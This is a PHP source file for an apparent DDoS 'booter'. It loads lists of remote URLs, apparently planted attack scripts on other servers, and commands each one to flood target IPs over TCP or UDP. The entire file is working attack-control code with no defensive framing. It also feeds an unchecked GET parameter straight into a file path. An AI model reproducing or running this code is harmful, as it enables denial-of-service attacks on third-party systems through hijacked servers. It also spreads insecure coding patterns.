<?php
class Booter {

    public $type = null;
    public $ips = array();

    public function kill($url) {
        if($this->type=="tcp") {
            //tcp flood
            foreach($this->ips as $value) {
                $parts = explode("~~~",$value);
                //url,ip,port
                $this->tcpRequest($url,$parts[0],$parts[1]);
            }
        }
        if($this->type=="udp") {
            //udp flood
            foreach($this->ips as $value) {
                $parts = explode("~~~",$value);
                //url,ip
                $this->udpRequest($url,$parts[0]);
            }
        }
    }

    private function tcpRequest($url,$ip,$port) {
        $postdata = http_build_query(
            array(
                'ip' => $ip,
                'time' => 1,
                'port' => $port
            )
        );
        $opts = array('http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => $postdata
            )
        );
        $context  = stream_context_create($opts);
        $result = @file_get_contents($url, false, $context);

        $pattern = preg_quote("Packet complete at ", '/');
        $pattern = "/^.*$pattern.*\$/m";

        if(preg_match_all($pattern, $result, $matches)){
            echo strip_tags(implode("\n", $matches[0]))."\n";
        }
    }

    private function udpRequest($url,$ip) {
        $result = @file_get_contents($url."?act=phptools&amp;host=".$ip."&amp;time=4");
        echo "Called: ".$url."?act=phptools&amp;host=".$ip."&amp;time=1\n";
    }

}
if(!empty($_GET["list"])) {
    $parts = explode("~~~",$_GET["list"]);

    $booter = new Booter();
    $booter->type=$parts[0];
    $arrayips = scandir("../ips/");
    unset($arrayips[0]);
    unset($arrayips[1]);
    $booter->ips=$arrayips;

    $file = file_get_contents("../lists/".$_GET["list"]);
    $linebyline = explode("\n",$file);
    foreach($linebyline as $value) {
        if(!empty($value)) {
            $booter->kill($value);
        }
    }
}
?>
